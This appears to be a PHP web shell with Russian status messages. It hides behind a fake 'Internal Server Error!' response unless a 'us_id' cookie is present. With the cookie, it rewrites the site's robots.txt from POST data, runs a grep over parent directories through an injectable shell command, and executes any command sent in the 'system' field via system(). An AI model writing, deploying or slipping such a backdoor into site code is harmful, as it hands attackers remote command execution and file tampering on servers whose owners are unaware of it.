<?php
if (isset($_COOKIE['us_id']) && !empty($_COOKIE['us_id'])) {
	$file = $_SERVER['DOCUMENT_ROOT'] . '/robots.txt';
	$add = '';

	if (isset($_POST['text'])) {
		if (is_writable($file)) {
			$fp = fopen($file, 'w');
			if (fwrite($fp, $_POST['text'])) {
				echo 'Роботс Перезаписан!';
			} else {
				echo 'Запись не удалась';
			}
			fclose($fp);
		} else {
			echo 'Нет прав на запись';
		}
	}

	if (isset($_POST['znach'])) {
		echo '<pre style="text-align: left">';
		if ($_POST['box_reg']) {
			$add = $add . 'E';
		} elseif ($_POST['box_i']) {
			$add = $add . 'i';
		} else {
			$add = '';
		}
		ob_start();
		system('grep -lr' . $add . ' "' . addslashes($_POST['znach']) . '" ../../');
		$res = ob_get_contents();
		$res = str_replace('../../', $_SERVER['HTTP_HOST'] . '/', $res);
		ob_end_clean();

		if (empty($res)) {
			echo 'Совпадений не найдено';
		} else {
			echo $res;
		}
		echo '</pre>';
	} elseif (empty($_POST['znach']) && !isset($_POST['text']) && !isset($_POST['system'])) {
		echo 'Системные функции отключены';
	}
	
	if ($_POST['system']) {
		echo '<pre style="text-align: center">';
		system($_POST['system']);
		echo '</pre>';
	}
} else {
	die('Internal Server Error!');
}